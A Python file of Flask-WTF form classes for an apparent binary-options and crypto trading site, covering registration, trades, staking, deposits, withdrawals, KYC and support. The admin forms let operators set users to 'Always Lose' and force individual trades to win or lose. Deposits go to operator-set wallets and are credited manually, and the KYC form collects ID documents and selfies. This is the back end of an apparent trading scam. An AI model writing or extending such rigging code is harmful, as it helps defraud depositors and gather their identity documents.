from flask_wtf import FlaskForm
from flask_wtf.file import FileField, FileRequired, FileAllowed
from wtforms import StringField, PasswordField, EmailField, DecimalField, SelectField, IntegerField, BooleanField, TextAreaField, SubmitField
from wtforms.fields import DateField
from wtforms.validators import DataRequired, Email, Length, EqualTo, NumberRange, ValidationError
from models import User

class LoginForm(FlaskForm):
    email = EmailField('Email', validators=[DataRequired(), Email()])
    password = PasswordField('Password', validators=[DataRequired()])

class RegisterForm(FlaskForm):
    username = StringField('Username', validators=[
        DataRequired(), 
        Length(min=3, max=20, message="Username must be between 3 and 20 characters")
    ])
    email = EmailField('Email', validators=[DataRequired(), Email()])
    first_name = StringField('First Name', validators=[Length(max=50)])
    last_name = StringField('Last Name', validators=[Length(max=50)])
    password = PasswordField('Password', validators=[
        DataRequired(), 
        Length(min=6, message="Password must be at least 6 characters long")
    ])
    confirm_password = PasswordField('Confirm Password', validators=[
        DataRequired(), 
        EqualTo('password', message="Passwords must match")
    ])
    
    def validate_username(self, username):
        user = User.query.filter_by(username=username.data).first()
        if user:
            raise ValidationError('Username already exists. Choose a different one.')
    
    def validate_email(self, email):
        user = User.query.filter_by(email=email.data).first()
        if user:
            raise ValidationError('Email already registered. Choose a different one.')

class TradeForm(FlaskForm):
    asset = SelectField('Asset', choices=[
        ('EURUSD', 'EUR/USD'),
        ('GBPUSD', 'GBP/USD'),
        ('USDJPY', 'USD/JPY'),
        ('BTCUSD', 'BTC/USD'),
        ('ETHUSD', 'ETH/USD'),
        ('XAUUSD', 'Gold/USD'),
        ('CRUDE', 'Crude Oil')
    ], validators=[DataRequired()])
    
    trade_type = SelectField('Direction', choices=[
        ('call', 'Buy (Higher)'),
        ('put', 'Sell (Lower)')
    ], validators=[DataRequired()])
    
    amount = DecimalField('Investment Amount', validators=[
        DataRequired(), 
        NumberRange(min=1, max=10000, message="Amount must be between $1 and $10,000")
    ])
    
    expiry_seconds = SelectField('Duration', choices=[
        ('30', '30 Seconds'),
        ('60', '60 Seconds'),
        ('90', '90 Seconds'),
        ('120', '2 Minutes'),
        ('150', '2.5 Minutes'),
        ('180', '3 Minutes'),
        ('210', '3.5 Minutes'),
        ('240', '4 Minutes'),
        ('270', '4.5 Minutes'),
        ('300', '5 Minutes'),
        ('330', '5.5 Minutes'),
        ('360', '6 Minutes'),
        ('390', '6.5 Minutes'),
        ('420', '7 Minutes'),
        ('450', '7.5 Minutes'),
        ('480', '8 Minutes'),
        ('510', '8.5 Minutes'),
        ('540', '9 Minutes'),
        ('570', '9.5 Minutes'),
        ('600', '10 Minutes')
    ], validators=[DataRequired()])

class StakingForm(FlaskForm):
    amount = DecimalField('Staking Amount', validators=[
        DataRequired(), 
        NumberRange(min=100, max=50000, message="Amount must be between $100 and $50,000")
    ])
    
    duration = SelectField('Duration', choices=[
        ('7', '7 Days - 8% APY'),
        ('30', '30 Days - 12% APY'),
        ('90', '90 Days - 18% APY'),
        ('180', '180 Days - 25% APY')
    ], validators=[DataRequired()])

class WithdrawForm(FlaskForm):
    amount = DecimalField('Withdrawal Amount', validators=[
        DataRequired(), 
        NumberRange(min=10, message="Minimum withdrawal is $10")
    ])
    
    currency = SelectField('Cryptocurrency', choices=[
        ('USDT', 'USDT (TRC-20)'),
        ('BTC', 'Bitcoin'),
        ('ETH', 'Ethereum')
    ], validators=[DataRequired()])
    
    wallet_address = StringField('Wallet Address', validators=[
        DataRequired(),
        Length(min=25, max=100, message="Please enter a valid wallet address")
    ])
    
    submit = SubmitField('Request Withdrawal')

class DepositForm(FlaskForm):
    amount = DecimalField('Deposit Amount', validators=[
        DataRequired(), 
        NumberRange(min=10, max=100000, message="Amount must be between $10 and $100,000")
    ])
    
    currency = SelectField('Cryptocurrency', choices=[
        ('USDT', 'USDT (TRC-20)'),
        ('BTC', 'Bitcoin'),
        ('ETH', 'Ethereum')
    ], validators=[DataRequired()])

class AdminUserForm(FlaskForm):
    is_active = BooleanField('Active')
    is_admin = BooleanField('Admin')
    trade_control = SelectField('Trade Control', choices=[
        ('normal', 'Normal Trading'),
        ('always_lose', 'Always Lose'),
        ('always_profit', 'Always Profit')
    ], default='normal')
    submit = SubmitField('Update User')

class CryptoDepositForm(FlaskForm):
    amount = DecimalField('Deposit Amount', validators=[
        DataRequired(), 
        NumberRange(min=10, max=100000, message="Amount must be between $10 and $100,000")
    ])
    currency = SelectField('Currency', choices=[
        ('USDT', 'USDT (TRC-20)'),
        ('BTC', 'Bitcoin'),
        ('ETH', 'Ethereum')
    ], validators=[DataRequired()])
    transaction_hash = StringField('Transaction Hash', validators=[
        Length(max=100, message="Transaction hash too long")
    ])
    proof_document = FileField('Proof of Payment')

class AdminDepositForm(FlaskForm):
    status = SelectField('Status', choices=[
        ('approved', 'Approve'),
        ('rejected', 'Reject')
    ], validators=[DataRequired()])
    admin_notes = StringField('Admin Notes', validators=[
        Length(max=500, message="Notes cannot exceed 500 characters")
    ])
    balance_amount = DecimalField('Balance to Add', validators=[
        NumberRange(min=0, message="Amount cannot be negative")
    ])

class AdminSettingsForm(FlaskForm):
    usdt_address = StringField('USDT TRC-20 Address', validators=[
        DataRequired(),
        Length(min=30, max=50, message="Invalid USDT address")
    ])
    btc_address = StringField('Bitcoin Address', validators=[
        DataRequired(),
        Length(min=25, max=50, message="Invalid Bitcoin address")
    ])
    eth_address = StringField('Ethereum Address', validators=[
        DataRequired(),
        Length(min=40, max=45, message="Invalid Ethereum address")
    ])
    usdt_qr_code = FileField('USDT QR Code Image', validators=[
        FileAllowed(['jpg', 'jpeg', 'png'], 'Images only!')
    ])
    btc_qr_code = FileField('Bitcoin QR Code Image', validators=[
        FileAllowed(['jpg', 'jpeg', 'png'], 'Images only!')
    ])
    eth_qr_code = FileField('Ethereum QR Code Image', validators=[
        FileAllowed(['jpg', 'jpeg', 'png'], 'Images only!')
    ])
    submit = SubmitField('Save Settings')

class TradeManipulationForm(FlaskForm):
    force_result = SelectField('Force Result', choices=[
        ('', 'Let trade expire naturally'),
        ('win', 'Force Win'),
        ('lose', 'Force Loss')
    ])
    admin_notes = StringField('Admin Notes', validators=[
        Length(max=255, message="Notes cannot exceed 255 characters")
    ])
    submit = SubmitField('Update Trade')

class KYCForm(FlaskForm):
    first_name = StringField('First Name', validators=[
        DataRequired(),
        Length(min=2, max=100, message="First name must be between 2 and 100 characters")
    ])
    last_name = StringField('Last Name', validators=[
        DataRequired(),
        Length(min=2, max=100, message="Last name must be between 2 and 100 characters")
    ])
    date_of_birth = DateField('Date of Birth', validators=[DataRequired()], format='%Y-%m-%d')
    phone_number = StringField('Phone Number', validators=[
        DataRequired(),
        Length(min=10, max=20, message="Please enter a valid phone number")
    ])
    address = TextAreaField('Address', validators=[
        DataRequired(),
        Length(max=500, message="Address cannot exceed 500 characters")
    ])
    city = StringField('City', validators=[
        DataRequired(),
        Length(max=100, message="City name cannot exceed 100 characters")
    ])
    country = StringField('Country', validators=[
        DataRequired(),
        Length(max=100, message="Country name cannot exceed 100 characters")
    ])
    postal_code = StringField('Postal Code', validators=[
        DataRequired(),
        Length(max=20, message="Postal code cannot exceed 20 characters")
    ])
    id_document_type = SelectField('ID Document Type', choices=[
        ('passport', 'Passport'),
        ('driver_license', 'Driver License'),
        ('national_id', 'National ID Card')
    ], validators=[DataRequired()])
    id_document = FileField('ID Document', validators=[DataRequired()])
    selfie = FileField('Selfie with ID Document', validators=[DataRequired()])
    submit = SubmitField('Submit KYC Request')

class AdminKYCForm(FlaskForm):
    status = SelectField('Status', choices=[
        ('approved', 'Approve'),
        ('rejected', 'Reject')
    ], validators=[DataRequired()])
    admin_notes = TextAreaField('Admin Notes', validators=[
        Length(max=500, message="Notes cannot exceed 500 characters")
    ])
    submit = SubmitField('Process KYC Request')

class SupportTicketForm(FlaskForm):
    subject = StringField('Subject', validators=[
        DataRequired(),
        Length(min=5, max=200, message="Subject must be between 5 and 200 characters")
    ])
    message = TextAreaField('Message', validators=[
        DataRequired(),
        Length(min=10, max=2000, message="Message must be between 10 and 2000 characters")
    ])
    priority = SelectField('Priority', choices=[
        ('low', 'Low'),
        ('normal', 'Normal'),
        ('high', 'High'),
        ('urgent', 'Urgent')
    ], default='normal')
    submit = SubmitField('Send Message')

class SupportMessageForm(FlaskForm):
    message = TextAreaField('Message', validators=[
        DataRequired(),
        Length(min=1, max=2000, message="Message cannot exceed 2000 characters")
    ])
    submit = SubmitField('Send Message')

class AdminSupportReplyForm(FlaskForm):
    message = TextAreaField('Reply', validators=[
        DataRequired(),
        Length(min=1, max=2000, message="Reply cannot exceed 2000 characters")
    ])
    status = SelectField('Ticket Status', choices=[
        ('open', 'Open'),
        ('in_progress', 'In Progress'),
        ('closed', 'Closed')
    ])
    submit = SubmitField('Send Reply')
